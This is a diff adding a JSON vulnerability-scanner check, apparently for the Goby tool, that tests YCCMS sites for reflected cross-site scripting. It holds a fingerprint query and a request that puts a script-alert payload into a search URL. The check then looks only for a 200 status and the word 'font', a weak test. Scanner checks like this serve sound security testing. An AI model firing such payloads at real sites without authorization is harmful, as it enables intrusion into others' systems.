@@ -1,0 +1,59 @@
+{
+      "Name": "YCCMS XSS",
+      "Level": "0",
+      "Tags": [
+            "xss"
+      ],
+      "GobyQuery": "body=\"templets/yycms/css/\"",
+      "Description": "",
+      "Product": "YCCMS",
+      "Homepage": "",
+      "Author": "",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/search-<script>alert(/xss/)</script>.html",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "text/html; charset=utf-8"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "font",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2022-04-22 02:04:22",
+      "GobyVersion": "1.9.325"
+}
